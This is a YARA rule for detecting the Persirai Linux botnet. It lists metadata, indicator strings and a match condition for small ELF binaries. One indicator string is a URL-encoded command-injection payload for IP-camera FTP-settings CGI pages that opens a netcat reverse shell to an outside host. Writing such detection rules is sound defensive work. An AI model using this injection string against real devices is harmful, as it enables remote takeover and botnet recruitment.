rule Trojan_DDoS_Linux_Persirai_20170705104759_994_286 
{
	meta:
		judge = "black"
		threatname = "Trojan[DDoS]/Linux.Persirai"
		threattype = "DDOS"
		family = "Persirai"
		hacker = "None"
		refer = "5ebeff1f005804bb8afef91095aac1d9"
		description = "Detects Persirai Botnet Malware"
		comment = "None"
		author = "asan"
		date = "2017-04-21"
	strings:
		$x1 = "ftpupload.sh"
		$x2 = "/dev/misc/watchdog"
		$x3 = "/dev/watchdog"
		$x4 = ":52869/picsdesc.xml"
		$x5 = "&next_url=ftp.htm&port=21&user=ftp&pwd=ftp&dir=/&mode=PORT&upload_interval=0&svr=%24%28nc+load.gtpnet.ir+1234+-e+%2Fbin%2Fsh%29"
		$s1 = "ftptest.cgi"
		$s2 = "set_ftp.cgi"
		$s3 = "2580e538f3723927f1ea2fdb8d57b99e9cc37ced1"
		$s4 = "023ea8c671c0abf77241886465200cf81b1a2bf5e"

	condition:
		uint16(0) == 0x457f and filesize < 300KB and 
( 
( 1 of ($x*) and 1 of ($s*) ) or 
2 of ($s*) 
)
}
